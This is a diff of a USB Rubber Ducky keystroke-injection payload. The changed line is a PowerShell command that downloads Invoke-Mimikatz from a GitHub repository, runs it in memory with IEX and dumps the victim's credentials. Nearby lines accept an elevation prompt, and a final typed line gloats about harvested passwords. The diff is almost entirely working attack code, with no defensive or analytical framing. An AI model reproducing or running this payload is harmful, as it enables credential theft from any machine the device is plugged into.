@@ -14,7 +14,7 @@ DELAY 3000
 ALT y
 DELAY 500
 REM Tried to combine with Start-Process above but it wasnt working. Will need to revisit...
-STRING powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"; Invoke-Mimikatz -DumpCreds
+STRING powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/binarycanary/usb-rubber-ducky--mimikatz-in-mem/master/Invoke-Mimikatz.ps1')"; Invoke-Mimikatz -DumpCreds
 ENTER
 STRING enjoy da passwerdz :)
 REM **************************************************
